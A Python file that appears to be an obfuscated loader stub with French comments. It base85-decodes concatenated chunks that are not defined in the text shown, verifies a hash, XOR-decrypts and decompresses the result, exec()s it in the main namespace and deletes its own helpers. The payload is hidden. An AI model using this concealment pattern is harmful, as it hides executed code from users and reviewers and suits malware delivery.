_pajnuaEbA2tB3N = __import__('base64').b85decode(_ckF0AYrsmFv27e + _c_Imz5_zcVdjYp + _cb613s5CIxsvkC + _cqxVro3R0wH3vn + _c_ykysZq_R1QJS + _co5kvYulS5xVcU + _ccKiakRVOEW24l + _cluuZlNVVlSX3N + _ciSHJAbaciQjlV + _cq2jlP_LpzsQRx + _ctqT67p5zmcGdi + _c_fNUClTvfrw6z + _csjZRIUmZEqQa_ + _ch15YI1gd4o6n1 + _ch56qoebu2kS_F + _cdeo5AvwMZMcyO + _cmr98AAj1XKp3i + _ckqUPA7buBDDvY + _cdxDDafW4Q5J9v + _ccRGIv5u9tfXDl + _cb9rLuKe_BV9P5 + _cms39bYxl_lnN6 + _cfRktoJt9qo8XR + _ctvHR68fKd4qK6 + _czEYAme3lFfAec + _ceHPtt2PVPkbxr + _ciKXDdksNsNwQz + _cq0348EKF55Z9G + _curIeKOlM1IXlj + _czxoaISAlWTTN2 + _cv9fXkgkmcLTLX + _cz830E9J4fITG9 + _cbrmZ3wCiIN5_j + _cgEWl4Un1hLgKo + _cjqROaT7RBLprO + _csd5u7TXxndLr6 + _caKxu0qv3WNaNO + _ct6FUoUJUCJVpJ + _cnbHSG9D47V4QZ + _cflFZ744pRoQAM + _cbjYGRRa2qZeej + _c_huxQazNIjaIZ + _cnAEeWbzW9AoHW + _cprbmVIs9HgMuH + _chx_0mqUBEfx6p + _c_czUgKyZ82HGH + _cbYEjVH4DbtUk_ + _cfjg0g40xu4son + _cxiyhLEOj7DXze + _cocSsAQvStRAm5 + _ckZow1pObIkmBI + _cuW_IPLIjnR4q_ + _ckwxqwe1mcyQYS + _cvYQFHFJKwbY0E + _cwYc1xgTSmzEst + _csVK8orMJhQMlr + _c_eq5Xm5q3LZo2 + _cjuxmPXDJgGeIb + _cvJSrpK__CdujN + _carOMnfr0he5wa + _couDfJlpw_uyM5 + _ckBB0OIeqJw5CP + _cmvNTo_wgjf18k + _cqJHWBPRCSAKwl + _csIl1xkc_z55kj + _cvzE06IKXXU3SU + _ceW4vTmyVvq2TB + _cpepzZZLKBgdn5 + _cfqxhEYu2hHzE0 + _cuwSDWIa4BvKvc + _chp_wh7av2I5E4 + _cegLZfUfjEBlhC + _cioSxKoZMUFvUE + _cfReNUhP7iwm7Z + _ceUdG0CgvRQgb7 + _cxkwZ8ql9zQ6Bq + _cv9OaxrVF6Nywi + _c_DlIYZGmKQbea + _csD21wZSdtP20b + _cheH7Cf7BRooDx + _czZ_zeLopFmMgq + _cajMZThPVnTVOy + _cpy7MZuwvknWrr + _czVrViqhpty2KW + _coVuqMckRPn3Z6 + _ctawBYCn1f0Gnp + _cuusKOxQ029LsL + _ciD0W0WdilmYUP + _cxd0khsd9cIwsB + _cexh0oDH56HZJ9 + _cfnlbeEHMCZ3Ai + _co0h_HeM2jnM9H + _cbi6lifjHIi9tF + _casgdppJ8gTTok + _ciK08djZ1whVnP + _chq31PGQaM_o3D + _cxljq5wUcyfkME + _cakePHdxyfkWlD + _caDjDb6yTrMnGZ + _cuNXLsPUUWx80l + _cgtd4V8X5sFgBy + _cp6YmMCDhtmB7k + _ckW3u9WgwQfUhL + _cu7cMz27nAP_Zs + _clqebAI3ZR814d + _cu24w9xEsOdW2f + _cxYOBnd5yZq5oN + _crmScOC4aIq21Q + _cujAtFtXt6M5RP + _coN7XwpXiBu_0q + _cf8OvGUYuXhViM + _csE3sNmD33o9YH + _czArUEr2rRdre4 + _crj9zsfqBWKqGD + _c_2hxbkgWZNyQY + _cjUcURQLMHhljv + _calrKC9jaNqZXg + _czAgT677hyOaih + _cySP4PwDnzGbHo + _cnWC3Jml4NUtsF + _cbLNxiT6I8Gise + _cfaKU3SwOPKeSg + _cs8m43thQvIiQD + _cnWfBZD1L2s33z + _cr74iwyxQ3WEvk + _cmWjdAXDcAAlkW + _caNbzOdq6BydEF + _co3Q6ryiDcgf5j + _ccr387WzG8we1P + _c_JOc7awDnDo5n + _cpbyjlpjf_WwKM + _c_GTEK9jd_EHeB + _cxRYzat9v8mzY3 + _cvSXkri9O5hHsz + _cb2uPLFHmYmO8Z + _csDSesisM60yzR + _c_jh_OBBHSwpqn + _ci2udy7WfgiSKg + _coaJwoATerxy1j + _cezZfN4xVnmdDY + _cxl1SE4tjZmW2W + _czYQj6RsSEzpJw + _crJuFNv8uk47yp + _cm7tLMmxllAq4L + _cvUwnSsRjDzKIo + _cpLJz4EJg02Eo3 + _cz81VH6sx_W1q3 + _cjIcS8QHDXzNK8 + _cqqkS7dXZc6ywK + _cvmBdKFbfP0GeZ + _cwuObGU7OHWTOM + _ceket8fjqVzjVS + _cmtHJQ8L8AnGM4 + _criIUNEogLsKSG + _ckK8bcg6cxGnHP + _c_eivNZ0u79Uxw + _ccJorlrUKChDhz + _cbyXzKEwJGbtbA + _c_nsO_x46orVdo + _cr2Yx3ugdS_zkI + _cgPhLhU6C_tLeu + _cf_eFiKBA7h6Si + _ct0yXrPkzPfBKR + _cwctjCpXHnn3HK + _czbBEDsPyqQEPn + _cxT8lKPzFgpZpA)
if __import__('hashlib').sha256(_pajnuaEbA2tB3N).hexdigest() != '2ab16b4c69cd5a91e596a08e32277b28e234c5dcf62d3c2c2c7d87fad112df07':
    __import__('sys').exit(1)
_xfIh02w90Z7V5V = bytes([62, 80, 201, 10, 52, 121, 50, 88, 121, 11, 193, 24, 229])
_fkmd6yNP8s5SatX = bytes([180, 199, 52, 85, 186, 64, 94, 233, 171, 83, 39, 113, 199])

def _fxhlaOR90shGGXS(_bm3jZDXXaYQSm8, _kcduUBd6YxNeX_):
    return bytes(_bm3jZDXXaYQSm8[_ixnPbdgJhETiz8] ^ _kcduUBd6YxNeX_[_ixnPbdgJhETiz8 % len(_kcduUBd6YxNeX_)] for _ixnPbdgJhETiz8 in range(len(_bm3jZDXXaYQSm8)))

def _fd_RytpX8Hz1osO(_twqa9TAjOBQtYq):
    import zlib
    return zlib.decompress(_twqa9TAjOBQtYq) # Un seul niveau de zlib ici pour simplifier

def _feca9HrcefuTdql():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xvjWTzxLP5BRN5 = _fxhlaOR90shGGXS(_pajnuaEbA2tB3N, _xfIh02w90Z7V5V)
    # 2. Décompression Zlib
    _dqHtrW1brPQAUX = _fd_RytpX8Hz1osO(_xvjWTzxLP5BRN5)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dqHtrW1brPQAUX.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nko0toRC41IFgl = _main.__dict__
    _nko0toRC41IFgl.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nko0toRC41IFgl)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feca9HrcefuTdql()
try:
    del _fxhlaOR90shGGXS, _fd_RytpX8Hz1osO, _feca9HrcefuTdql
    del _pajnuaEbA2tB3N, _xfIh02w90Z7V5V, _fkmd6yNP8s5SatX
except:
    pass
